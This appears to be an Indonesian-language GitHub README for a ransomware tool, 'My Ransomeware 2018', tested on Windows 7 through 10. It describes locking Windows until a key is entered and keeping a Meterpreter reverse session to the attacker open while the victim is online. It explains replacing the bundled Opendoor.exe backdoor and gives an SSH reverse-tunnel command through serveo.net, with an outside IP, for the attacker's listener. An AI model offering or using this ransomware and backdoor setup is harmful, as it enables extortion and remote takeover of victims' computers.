# My Ransomeware 2018

[Catatan]

-jalankan software pada virtual operating system yang berjalan pada VMWare atau virtualBox

-jangan merubah nama folder (VirusUI), mengedit nama file pada folder tersebut jika anda menjalankan pada BypassWinSetup.exe


[Cara Kerja Software]

-Windows akan terkunci dan anda tidak bisa melakukan apa2 karna system inti di nonaktifkan cara satu2nya anda harus unlock dengan memasukan encrypt key ke dalam software untuk kambali ke seperti semula

-Selama komputer victim terhubung ke internet, maka komputer victim akan terus tersuntikan meterpreter dengan komputer penyerang secara realtime


[Opendoor.exe]

jika anda sudah memiliki pengetahuan tentang pembuatan file backdoor, anda bisa merubah reverse untuk meterpreter dengan menimpah file Opendoor.exe dengan backdoor buatan anda.


[SSH]

Backdoor mendengarkan port 9998 dengan IP 159.89.214.31 dari seveo.net

[cmd] -> ssh -R 9998:127.0.0.1:4444 darksite@serveo.net


[Tested Works]

Windows 10 versi up

windows 8

windows 7

[Screenshoot]

![alt tag](https://github.com/webmestudio/myransomeware/blob/master/screenshoot/RS1.PNG)
![alt tag](https://github.com/webmestudio/myransomeware/blob/master/screenshoot/RS2.PNG)
![alt tag](https://github.com/webmestudio/myransomeware/blob/master/screenshoot/RS3.PNG)
![alt tag](https://github.com/webmestudio/myransomeware/blob/master/screenshoot/RS4.PNG)
